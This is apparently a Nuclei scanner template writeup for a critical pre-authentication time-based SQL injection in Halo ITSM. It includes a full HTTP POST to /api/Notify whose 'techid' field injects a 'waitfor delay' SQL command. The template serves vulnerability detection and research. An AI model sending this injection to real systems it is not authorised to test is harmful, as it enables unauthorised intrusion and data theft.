# Nuclei Template: Halo ITSM - Pre-Authentication SQL Injection
**Template ID:** halo-tism-sqli
**Vulnerability Class:** SQL Injection
**Severity:** Critical
**CWE:** CWE-89
**Source:** Nuclei Template (`halo-tism-sqli.yaml`)

## Vulnerability Information & PoC

## Description
A Time-Based SQL Injection vulnerability in Halo ITSM allows unauthenticated attackers to execute malicious SQL queries by leveraging time delays, potentially leading to data exfiltration, privilege escalation, or full system compromise.

## Steps to reproduce / Exploit Payload
```http
@timeout: 20s
POST /api/Notify HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{
  "sessionid": "{{randstr}}",
  "tracking0": "{{string}}",
  "techid": "1;waitfor delay '0:0:6'--",
  "pickuptime": "2025-03-03T10:00:00",
  "lastactiontime": "2025-03-03T10:00:00",
  "chatlog": "{{randstr}}"
}
```

## References
- https://slcyber.io/assetnote-security-research-center/loose-types-sink-ships-pre-authentication-sql-injection-in-halo-itsm/
